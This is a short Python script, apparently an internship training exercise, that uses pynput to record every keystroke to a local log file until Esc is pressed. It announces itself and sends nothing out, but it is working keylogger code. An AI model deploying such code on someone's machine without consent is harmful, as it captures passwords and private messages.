# keylogger.py
# Task 4 - Prodigy InfoTech Cyber Security Internship
# A simple keylogger that records keystrokes into log.txt

from pynput import keyboard

# File where logs will be saved
log_file = "log.txt"

def write_to_file(key):
    with open(log_file, "a") as f:
        f.write(str(key) + "\n")

def on_press(key):
    try:
        write_to_file(key.char)
    except AttributeError:
        write_to_file(str(key))

def on_release(key):
    # Stop the keylogger when 'Esc' is pressed
    if key == keyboard.Key.esc:
        return False

# Listener
with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
    print("Keylogger started... Press ESC to stop.")
    listener.join()
